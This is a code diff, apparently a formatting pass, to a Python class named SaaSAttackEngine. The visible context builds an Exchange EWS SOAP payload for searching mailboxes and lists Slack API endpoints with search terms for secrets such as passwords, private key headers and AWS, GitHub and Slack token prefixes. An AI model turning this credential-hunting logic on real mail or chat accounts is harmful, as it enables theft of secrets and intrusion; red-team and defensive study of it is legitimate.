@@ -16,6 +16,7 @@ from typing import Any
 
 try:
     import requests  # noqa: F401
+
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
@@ -188,7 +189,7 @@ class SaaSAttackEngine:
         Returns:
             Dict with EWS SOAP payload and search configuration.
         """
-        ews_body = f'''<?xml version="1.0" encoding="utf-8"?>
+        ews_body = f"""<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
   xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
@@ -210,7 +211,7 @@ class SaaSAttackEngine:
       <m:QueryString>{search_term}</m:QueryString>
     </m:FindItem>
   </soap:Body>
-</soap:Envelope>'''
+</soap:Envelope>"""
 
         return {
             "attack_type": "ews_mail_search",
@@ -301,10 +302,25 @@ class SaaSAttackEngine:
                 "https://slack.com/api/team.info",
             ],
             "search_terms": [
-                "password", "secret", "credential", "token", "api key",
-                "ssh-rsa", "BEGIN RSA", "BEGIN OPENSSH", "access_key",
-                "AKIA", "ghp_", "xoxb-", "xoxp-", "sk-",
-                "login", "admin", "root", "terraform", "tfstate",
+                "password",
+                "secret",
+                "credential",
+                "token",
+                "api key",
+                "ssh-rsa",
+                "BEGIN RSA",
+                "BEGIN OPENSSH",
+                "access_key",
+                "AKIA",
+                "ghp_",
+                "xoxb-",
+                "xoxp-",
+                "sk-",
+                "login",
+                "admin",
+                "root",
+                "terraform",
+                "tfstate",
             ],
         }
 
